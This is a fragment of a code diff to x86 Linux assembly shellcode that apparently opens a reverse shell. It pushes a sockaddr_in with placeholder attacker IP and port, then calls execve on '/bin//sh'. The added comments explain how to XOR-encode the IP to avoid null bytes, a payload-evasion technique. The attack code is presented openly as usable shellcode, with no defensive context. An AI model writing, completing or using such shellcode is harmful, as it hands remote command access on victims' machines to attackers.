@@ -28,6 +28,12 @@ push edx
 
 ;struct sock_addr_in----------------                        
 push word ;enter ip      ;ip   [NOTE]: be careful of null bytes in ip address :)     
+;in case of nullbytes use ======================
+;xor hex(ip) with another hex(A)  -> B=hex(ip) xor hex(A) 
+;mov eax, ;B                                          
+;xor eax, ;A                                              
+;push eax ;:)                                                 
+;===============================================
 push word ;enter port    ;Port       
 push word  0x02          ;AF_INET ipv4 <family>
 ;struct pushed to stack-------------
@@ -86,5 +92,4 @@ push 0x6e69622f
 mov ebx,esp  ;move stack pointer to pass reference to "/bin//sh"
 mov al,0xb   ;execve syscall :)
 int 0x80
-
 
